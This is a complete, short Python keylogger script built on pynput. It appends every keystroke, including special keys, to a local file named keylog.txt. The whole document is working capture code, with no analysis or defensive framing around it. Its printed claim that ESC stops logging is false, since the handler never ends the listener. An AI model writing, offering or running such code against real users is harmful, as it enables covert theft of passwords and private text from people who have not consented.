from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            if hasattr(key, 'char') and key.char is not None:
                file.write(key.char)
            else:
                file.write(f'[{key.name}]')  
    except Exception as e:
        print("Error:", e)

def main():
    print("🔑 Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
